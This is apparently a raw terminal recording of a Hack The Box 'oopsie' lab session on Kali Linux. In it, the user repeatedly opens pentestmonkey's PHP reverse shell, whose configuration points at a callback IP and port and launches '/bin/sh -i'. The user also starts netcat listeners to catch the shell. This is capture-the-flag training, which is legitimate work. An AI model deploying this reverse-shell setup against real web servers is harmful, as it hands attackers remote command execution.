+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[1m[31mn[0m[39m[1m[31mn[0m[39m[38;2;153;153;153mano php-reverse-shell.php[39m[25D[0m[32mn[32mc[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [24D[38;2;153;153;153m -zv 194.37.1.82 27017[39m[22D[39m [35m-[39m[35m-[35ml[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[35m-[39m[39m [38;2;153;153;153mzv 194.37.1.82 27017[39m[20D[35m-[35mn[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[38;2;153;153;153mvlp 12345[39m[9D[35mn[35mv[39m[?2004l
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[4mc[24m[4mc[24m[38;2;153;153;153mp php-reverse-shell.php php-reverse-shell2.php[39m[46D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [47D[4mc[24m[4mc[24m[38;2;153;153;153mp php-reverse-shell.php php-reverse-shell2.php[39m[46D[24m[1m[31mc[1m[31ma[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [45D[38;2;153;153;153mt ../salida.txt[39m[15D[0m[32mc[0m[32ma[32mt[39m[39m [39m[4mp[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[38;2;153;153;153mrod.dtsConfig[39m[13D[4mp[39m[4mh[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[4mh[4mp[24m[4mp[4m-reverse-shell[24m[17D[24mp[24mh[24mp[24m-[24mr[24me[24mv[24me[24mr[24ms[24me[24m-[24ms[24mh[24me[24ml[24ml  [18D[4mp[4mh[4mp[4m-[4mr[4me[4mv[4me[4mr[4ms[4me[4m-[4ms[4mh[4me[4ml[4ml[24m[4ml[24m[24m [4me[24m[24m [4mh[24m[24m [4ms[24m[24m [4m-[24m[24m [4me[24m[24m [4ms[24m[24m [4mr[24m[24m [4me[24m[24m [4mv[24m[24m [4me[24m[24m [4mr[24m[24m [4m-[24m[24m [4mp[24m[24m [4mh[24m[24m [4mp[24m[24m [38;2;153;153;153mrod.dtsConfig[39m[13D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[38;2;153;153;153m../salida.txt[39m[13D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[38;2;153;153;153m ../salida.txt[39m[14D[1m[31mc[1m[31ma[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[38;2;153;153;153mt ../salida.txt[39m[15D[0m[39m[4mc[24m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[4mc[24m[38;2;153;153;153mp php-reverse-shell.php php-reverse-shell2.php[39m[46D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [47D[4mc[24m[4mc[24m[38;2;153;153;153mp php-reverse-shell.php php-reverse-shell2.php[39m[46D[24m[1m[31mc[1m[31ma[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [45D[38;2;153;153;153mt ../salida.txt[39m[15D[0m[32mc[0m[32ma[32mt[39m[39m [39mr[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[38;2;153;153;153medis_input.txt | nc 10.129.231.100 6379[39m[39D[39me [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39D[38;2;153;153;153medis_input.txt | nc 10.129.231.100 6379[39m[39D[32mc[32mp[39m[39m [4mp[4mh[39m[4mp[39m[4m-[39m[4mr[39m[4me[39m[4mv[39m[4me[39m[4mr[39m[4ms[39m[4me[39m[4m-[39m[4ms[39m[4mh[39m[4me[39m[4ml[39m[4ml[39m[4m.[39m[4mp[39m[4mh[39m[4mp[24m[39m [39m[4mp[39m[4mh[39m[4mp[39m[4m-[39m[4mr[39m[4me[39m[4mv[39m[4me[39m[4mr[39m[4ms[39m[4me[39m[4m-[39m[4ms[39m[4mh[39m[4me[39m[4ml[39m[4ml[39m[4m2[39m[4m.[4mphp[24m[47D[32mn[32ma[32mn[24m[32mo[39m[24m [20P[17C[4m.[4mp[4mh[4mp[24m[24m                     [21D[?1l>[?2004l
+[?2004h[?1049h[22;0;0t[1;20r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[18;77H(B[0;7m[ Reading... ](B[m[18;75H(B[0;7m[ Read 192 lines ](B[m[H(B[0;7m  GNU nano 6.0                                                             php-reverse-shell.php                                                                       [1;166H(B[m[19d(B[0;7m^G(B[m Help[19;17H(B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut[19;65H(B[0;7m^T(B[m Execute[81G(B[0;7m^C(B[m Location     (B[0;7mM-U(B[m Undo[19;113H(B[0;7mM-A(B[m Set Mark    (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[20d(B[0;7m^X(B[m Exit[20;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste[20;65H(B[0;7m^J(B[m Justify[81G(B[0;7m^/(B[m Go To Line   (B[0;7mM-E(B[m Redo[20;113H(B[0;7mM-6(B[m Copy[20;129H(B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[2d(B[0;1m[32m<?php[3d[34m// php-reverse-shell - A Reverse Shell implementation in PHP[4d// Copyright (C) 2007 pentestmonkey@pentestmonkey.net[5d//[6d// This tool may be used for legal purposes only.  Users take full responsibility[7d// for any actions performed using this tool.  The author accepts no liability[8d// for damage caused by this tool.  If these terms are not acceptable to you, then[9d// do not use this tool.[10d//[11d// In all other respects the GPL version 2 applies:[12d//[13d// This program is free software; you can redistribute it and/or modify[14d// it under the terms of the GNU General Public License version 2 as[15d// published by the Free Software Foundation.[16d//[17d// This program is distributed in the hope that it will be useful,[2d[39m(B[m[?12l[?25h[?25l[?12l[?25h[3d[?25l[?12l[?25h[4d[?25l[?12l[?25h[5d[?25l[?12l[?25h[6d[?25l[?12l[?25h[7d[?25l[?12l[?25h[8d[?25l[?12l[?25h[9d[?25l[?12l[?25h[10d[?25l[?12l[?25h[11d[?25l[?12l[?25h[12d[?25l[?12l[?25h[13d[?25l[?12l[?25h[14d[?25l[?12l[?25h[15d[?25l[?12l[?25h[16d[?25l[?12l[?25h[17d[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// but WITHOUT ANY WARRANTY; without even the implied warranty of[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// GNU General Public License for more details.[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[18d[K[?12l[?25h7[2;18r8
+[1;20r[17;1H(B[0;1m[34m// You should have received a copy of the GNU General Public License along[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// with this program; if not, write to the Free Software Foundation, Inc.,[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// This tool may be used for legal purposes only.  Users take full responsibility[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// for any actions performed using this tool.  If these terms are not acceptable to[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// you, then do not use this tool.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// You are encouraged to send comments, improvements or suggestions to[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// me at pentestmonkey@pentestmonkey.net[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Description[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----------[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// This script will make an outbound TCP connection to a hardcoded IP and port.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// The recipient will be given a shell running as the current user (apache normally).[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Limitations[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----------[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// proc_open and stream_set_blocking require PHP version 4.3+, or 5+[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Usage[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1Hset_time_limit (0);[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$VERSION[39m(B[m = (B[0;1m[33m"1.0"[39m(B[m;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$ip[39m(B[m = (B[0;1m[33m'10.10.15.165'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$port[39m(B[m = 1234;(B[0;1m[34m       // CHANGE THIS[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$chunk_size[39m(B[m = 1400;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$write_a[39m(B[m = null;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$error_a[39m(B[m = null;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$shell[39m(B[m = (B[0;1m[33m'uname -a; w; id; /bin/sh -i'[39m(B[m;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$daemon[39m(B[m = 0;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$debug[39m(B[m = 0;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[19d[J[20d[?12l[?25h[20;1H[?1049l[23;0;0t[?1l>[?2004l                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[32mnano[39m [4mphp-reverse-shell.php[24m[26D[32mc[32mp[39m[P[P[22C [4mphp-reverse-shell2.php[24m[47D[32mn[32ma[32mn[24m[32mo[39m[24m [20P[17C[4m.[4mp[4mh[4mp[24m[24m                     [21D[4mh[24m[24m [38;2;153;153;153mp[39m[4mp[24m[24m [39m [38;2;153;153;153mhp[39m[4m.[24m[24m [39m [39m [38;2;153;153;153mphp[39m[4ml[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4ml[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4me[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4mh[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4ms[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4m-[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4me[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4ms[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4mr[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4me[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4mv[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4me[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4mr[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4m-[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4mp[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4mh[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [4mp[24m[24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [24m[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [39m [39m [39m [38;2;153;153;153m php-reverse-shell.php[39m[22D[1m[31mn[1m[31ma[1m[31mn[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [23D[38;2;153;153;153mo php-reverse-shell.php[39m[23D[1m[31mn[1m[31ma[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [24D[38;2;153;153;153mno php-reverse-shell.php[39m[24D[1m[31mn[0m[39m[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [25D[1m[31mn[0m[39m[38;2;153;153;153mano php-reverse-shell.php[39m[25D[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [26D[1m[31mn[0m[39m[1m[31mn[0m[39m[38;2;153;153;153mano php-reverse-shell.php[39m[25D[0m[32mn[32mc[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [24D[38;2;153;153;153m -zv 194.37.1.82 27017[39m[22D[39m [35m-[39m[35m-[35ml[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[35m-[39m[39m [38;2;153;153;153mzv 194.37.1.82 27017[39m[20D[35m-[35mn[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[38;2;153;153;153mvlp 12345[39m[9D[35mn[35mv[35ml[35mp[39m[39m [39m1[39m2[39m3[39m4[39m5 [38;2;153;153;153m5[39m[39m [?1l>[?2004l
+listening on [any] 1234 ...
+^C
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[32mnc[39m [35m-nvlp[39m 1234[13D[32mn[32ma[32mn[32mo[39m[39m [39m[4mp[39m[4mh[39m[4mp[4m-[4mr[4me[4mv[4me[4mrse-shell.php[24m[?1l>[?2004l
+[?2004h[?1049h[22;0;0t[1;20r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[18;77H(B[0;7m[ Reading... ](B[m[18;75H(B[0;7m[ Read 192 lines ](B[m[H(B[0;7m  GNU nano 6.0                                                             php-reverse-shell.php                                                                       [1;166H(B[m[19d(B[0;7m^G(B[m Help[19;17H(B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut[19;65H(B[0;7m^T(B[m Execute[81G(B[0;7m^C(B[m Location     (B[0;7mM-U(B[m Undo[19;113H(B[0;7mM-A(B[m Set Mark    (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[20d(B[0;7m^X(B[m Exit[20;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste[20;65H(B[0;7m^J(B[m Justify[81G(B[0;7m^/(B[m Go To Line   (B[0;7mM-E(B[m Redo[20;113H(B[0;7mM-6(B[m Copy[20;129H(B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[2d(B[0;1m[32m<?php[3d[34m// php-reverse-shell - A Reverse Shell implementation in PHP[4d// Copyright (C) 2007 pentestmonkey@pentestmonkey.net[5d//[6d// This tool may be used for legal purposes only.  Users take full responsibility[7d// for any actions performed using this tool.  The author accepts no liability[8d// for damage caused by this tool.  If these terms are not acceptable to you, then[9d// do not use this tool.[10d//[11d// In all other respects the GPL version 2 applies:[12d//[13d// This program is free software; you can redistribute it and/or modify[14d// it under the terms of the GNU General Public License version 2 as[15d// published by the Free Software Foundation.[16d//[17d// This program is distributed in the hope that it will be useful,[2d[39m(B[m[?12l[?25h[?25l[?12l[?25h[3d[?25l[?12l[?25h[4d[?25l[?12l[?25h[5d[?25l[?12l[?25h[6d[?25l[?12l[?25h[7d[?25l[?12l[?25h[8d[?25l[?12l[?25h[9d[?25l[?12l[?25h[10d[?25l[?12l[?25h[11d[?25l[?12l[?25h[12d[?25l[?12l[?25h[13d[?25l[?12l[?25h[14d[?25l[?12l[?25h[15d[?25l[?12l[?25h[16d[?25l[?12l[?25h[17d[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// but WITHOUT ANY WARRANTY; without even the implied warranty of[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// GNU General Public License for more details.[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[18d[K[?12l[?25h7[2;18r8
+[1;20r[17;1H(B[0;1m[34m// You should have received a copy of the GNU General Public License along[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// with this program; if not, write to the Free Software Foundation, Inc.,[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// This tool may be used for legal purposes only.  Users take full responsibility[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// for any actions performed using this tool.  If these terms are not acceptable to[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// you, then do not use this tool.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// You are encouraged to send comments, improvements or suggestions to[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// me at pentestmonkey@pentestmonkey.net[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Description[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----------[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// This script will make an outbound TCP connection to a hardcoded IP and port.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// The recipient will be given a shell running as the current user (apache normally).[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Limitations[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----------[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// proc_open and stream_set_blocking require PHP version 4.3+, or 5+[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Usage[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1Hset_time_limit (0);[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$VERSION[39m(B[m = (B[0;1m[33m"1.0"[39m(B[m;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$ip[39m(B[m = (B[0;1m[33m'10.10.15.165'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$port[39m(B[m = 1234;(B[0;1m[34m       // CHANGE THIS[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$chunk_size[39m(B[m = 1400;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$write_a[39m(B[m = null;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$error_a[39m(B[m = null;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$shell[39m(B[m = (B[0;1m[33m'uname -a; w; id; /bin/sh -i'[39m(B[m;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$daemon[39m(B[m = 0;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$debug[39m(B[m = 0;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[?12l[?25h[A[?25l[19d[J[20d[?12l[?25h[20;1H[?1049l[23;0;0t[?1l>[?2004l                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[32mnano[39m [4mphp-reverse-shell.php[24m[26D[32mn[32mc[39m[39m [35m-[35mn[24m[35mv[24m[35ml[24m[35mp[39m[24m [24m1[24m2[24m3[24m4[24m [24m [24m [24m [24m [24m [24m [24m [24m [24m [24m [24m [24m [13D[?1l>[?2004l
+listening on [any] 1234 ...
+^C
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[32mnc[39m [35m-nvlp[39m 1234[13D[32mn[32ma[32mn[32mo[39m[39m [39m[4mp[39m[4mh[39m[4mp[4m-[4mr[4me[4mv[4me[4mrse-shell.php[24m[?1l>[?2004l
+[?2004h[?1049h[22;0;0t[1;20r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[18;77H(B[0;7m[ Reading... ](B[m[18;75H(B[0;7m[ Read 192 lines ](B[m[H(B[0;7m  GNU nano 6.0                                                             php-reverse-shell.php                                                                       [1;166H(B[m[19d(B[0;7m^G(B[m Help[19;17H(B[0;7m^O(B[m Write Out    (B[0;7m^W(B[m Where Is     (B[0;7m^K(B[m Cut[19;65H(B[0;7m^T(B[m Execute[81G(B[0;7m^C(B[m Location     (B[0;7mM-U(B[m Undo[19;113H(B[0;7mM-A(B[m Set Mark    (B[0;7mM-](B[m To Bracket  (B[0;7mM-Q(B[m Previous[20d(B[0;7m^X(B[m Exit[20;17H(B[0;7m^R(B[m Read File    (B[0;7m^\(B[m Replace[49G(B[0;7m^U(B[m Paste[20;65H(B[0;7m^J(B[m Justify[81G(B[0;7m^/(B[m Go To Line   (B[0;7mM-E(B[m Redo[20;113H(B[0;7mM-6(B[m Copy[20;129H(B[0;7m^Q(B[m Where Was    (B[0;7mM-W(B[m Next[2d(B[0;1m[32m<?php[3d[34m// php-reverse-shell - A Reverse Shell implementation in PHP[4d// Copyright (C) 2007 pentestmonkey@pentestmonkey.net[5d//[6d// This tool may be used for legal purposes only.  Users take full responsibility[7d// for any actions performed using this tool.  The author accepts no liability[8d// for damage caused by this tool.  If these terms are not acceptable to you, then[9d// do not use this tool.[10d//[11d// In all other respects the GPL version 2 applies:[12d//[13d// This program is free software; you can redistribute it and/or modify[14d// it under the terms of the GNU General Public License version 2 as[15d// published by the Free Software Foundation.[16d//[17d// This program is distributed in the hope that it will be useful,